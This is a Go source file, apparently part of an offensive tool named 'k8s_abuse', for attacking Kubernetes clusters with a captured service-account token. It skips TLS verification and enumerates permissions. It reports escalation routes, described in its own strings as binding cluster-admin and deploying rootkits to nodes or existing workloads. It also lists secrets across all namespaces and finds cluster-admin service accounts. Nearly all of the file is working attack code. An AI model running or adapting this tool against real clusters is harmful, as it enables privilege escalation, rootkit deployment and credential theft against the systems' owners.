package k8s_abuse

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	authv1 "k8s.io/api/authorization/v1"
	corev1 "k8s.io/api/core/v1"
	rbacv1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"
)

type AbuseResult struct {
	Action      string           `json:"action"`
	Permissions []PermissionInfo `json:"permissions,omitempty"`
	Escalation  *EscalationInfo  `json:"escalation,omitempty"`
	Secrets     []SecretEntry    `json:"secrets,omitempty"`
}

type PermissionInfo struct {
	Resource  string `json:"resource"`
	Verb      string `json:"verb"`
	Namespace string `json:"namespace"`
	Allowed   bool   `json:"allowed"`
}

type EscalationInfo struct {
	Method  string `json:"method"`
	Success bool   `json:"success"`
	Detail  string `json:"detail"`
}

type SecretEntry struct {
	Name      string `json:"name"`
	Namespace string `json:"namespace"`
	Type      string `json:"type"`
	Keys      []string `json:"keys"`
}

func Execute(action, token, namespace, output string) error {
	client, err := getClient(token)
	if err != nil {
		return fmt.Errorf("k8s client init failed: %w", err)
	}

	ctx := context.Background()
	var result *AbuseResult

	switch action {
	case "enum":
		result, err = enumPermissions(ctx, client, namespace)
	case "escalate":
		result, err = escalatePrivileges(ctx, client, namespace)
	case "dump-secrets":
		result, err = dumpSecrets(ctx, client, namespace)
	default:
		return fmt.Errorf("unsupported action: %s (use enum, escalate, or dump-secrets)", action)
	}

	if err != nil {
		return err
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func getClient(token string) (*kubernetes.Clientset, error) {
	if token != "" {
		config := &rest.Config{
			Host:        os.Getenv("KUBERNETES_SERVICE_HOST") + ":" + os.Getenv("KUBERNETES_SERVICE_PORT"),
			BearerToken: token,
			TLSClientConfig: rest.TLSClientConfig{
				Insecure: true,
			},
		}
		if config.Host == ":" {
			config.Host = "https://kubernetes.default.svc"
		}
		return kubernetes.NewForConfig(config)
	}

	config, err := rest.InClusterConfig()
	if err != nil {
		kubeconfig := filepath.Join(homeDir(), ".kube", "config")
		config, err = clientcmd.BuildConfigFromFlags("", kubeconfig)
		if err != nil {
			return nil, err
		}
	}
	return kubernetes.NewForConfig(config)
}

func homeDir() string {
	if h := os.Getenv("HOME"); h != "" {
		return h
	}
	return os.Getenv("USERPROFILE")
}

func enumPermissions(ctx context.Context, client *kubernetes.Clientset, namespace string) (*AbuseResult, error) {
	result := &AbuseResult{Action: "enum"}

	resources := []string{"pods", "secrets", "deployments", "daemonsets", "clusterrolebindings", "serviceaccounts", "nodes"}
	verbs := []string{"get", "list", "create", "delete", "update"}

	ns := namespace
	if ns == "" || ns == "all" {
		ns = "*"
	}

	for _, resource := range resources {
		for _, verb := range verbs {
			allowed := checkAccess(ctx, client, verb, resource, ns)
			result.Permissions = append(result.Permissions, PermissionInfo{
				Resource:  resource,
				Verb:      verb,
				Namespace: ns,
				Allowed:   allowed,
			})
		}
	}

	return result, nil
}

func checkAccess(ctx context.Context, client *kubernetes.Clientset, verb, resource, namespace string) bool {
	review := &authv1.SelfSubjectAccessReview{
		Spec: authv1.SelfSubjectAccessReviewSpec{
			ResourceAttributes: &authv1.ResourceAttributes{
				Namespace: namespace,
				Verb:      verb,
				Resource:  resource,
			},
		},
	}

	resp, err := client.AuthorizationV1().SelfSubjectAccessReviews().Create(ctx, review, metav1.CreateOptions{})
	if err != nil {
		return false
	}
	return resp.Status.Allowed
}

func escalatePrivileges(ctx context.Context, client *kubernetes.Clientset, namespace string) (*AbuseResult, error) {
	result := &AbuseResult{Action: "escalate"}

	if checkAccess(ctx, client, "create", "clusterrolebindings", "*") {
		result.Escalation = &EscalationInfo{
			Method:  "create-clusterrolebinding",
			Success: true,
			Detail:  "can create ClusterRoleBinding — bind cluster-admin to current SA",
		}
		return result, nil
	}

	if checkAccess(ctx, client, "create", "pods", namespace) {
		result.Escalation = &EscalationInfo{
			Method:  "create-privileged-pod",
			Success: true,
			Detail:  "can create pods — spawn privileged pod with hostPID/hostNetwork",
		}
		return result, nil
	}

	if checkAccess(ctx, client, "create", "daemonsets", namespace) {
		result.Escalation = &EscalationInfo{
			Method:  "create-daemonset",
			Success: true,
			Detail:  "can create DaemonSets — deploy rootkit across all nodes",
		}
		return result, nil
	}

	if checkAccess(ctx, client, "update", "deployments", namespace) {
		result.Escalation = &EscalationInfo{
			Method:  "patch-deployment",
			Success: true,
			Detail:  "can update deployments — inject rootkit container into existing workloads",
		}
		return result, nil
	}

	result.Escalation = &EscalationInfo{
		Method:  "none",
		Success: false,
		Detail:  "no direct escalation path found with current permissions",
	}
	return result, nil
}

func dumpSecrets(ctx context.Context, client *kubernetes.Clientset, namespace string) (*AbuseResult, error) {
	result := &AbuseResult{Action: "dump-secrets"}

	namespaces := []string{namespace}
	if namespace == "" || namespace == "all" {
		nsList, err := client.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
		if err != nil {
			return nil, fmt.Errorf("failed to list namespaces: %w", err)
		}
		namespaces = nil
		for _, ns := range nsList.Items {
			namespaces = append(namespaces, ns.Name)
		}
	}

	for _, ns := range namespaces {
		secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, secret := range secrets.Items {
			var keys []string
			for k := range secret.Data {
				keys = append(keys, k)
			}
			result.Secrets = append(result.Secrets, SecretEntry{
				Name:      secret.Name,
				Namespace: secret.Namespace,
				Type:      string(secret.Type),
				Keys:      keys,
			})
		}
	}

	return result, nil
}

func EnumRoles(ctx context.Context, client *kubernetes.Clientset) ([]rbacv1.ClusterRole, error) {
	roles, err := client.RbacV1().ClusterRoles().List(ctx, metav1.ListOptions{})
	if err != nil {
		return nil, err
	}
	return roles.Items, nil
}

func FindPrivilegedSA(ctx context.Context, client *kubernetes.Clientset, namespace string) ([]corev1.ServiceAccount, error) {
	sas, err := client.CoreV1().ServiceAccounts(namespace).List(ctx, metav1.ListOptions{})
	if err != nil {
		return nil, err
	}

	var privileged []corev1.ServiceAccount
	bindings, err := client.RbacV1().ClusterRoleBindings().List(ctx, metav1.ListOptions{})
	if err != nil {
		return sas.Items, nil
	}

	privSANames := make(map[string]bool)
	for _, binding := range bindings.Items {
		if binding.RoleRef.Name == "cluster-admin" {
			for _, subject := range binding.Subjects {
				if subject.Kind == "ServiceAccount" {
					privSANames[subject.Namespace+"/"+subject.Name] = true
				}
			}
		}
	}

	for _, sa := range sas.Items {
		if privSANames[sa.Namespace+"/"+sa.Name] {
			privileged = append(privileged, sa)
		}
	}
	return privileged, nil
}
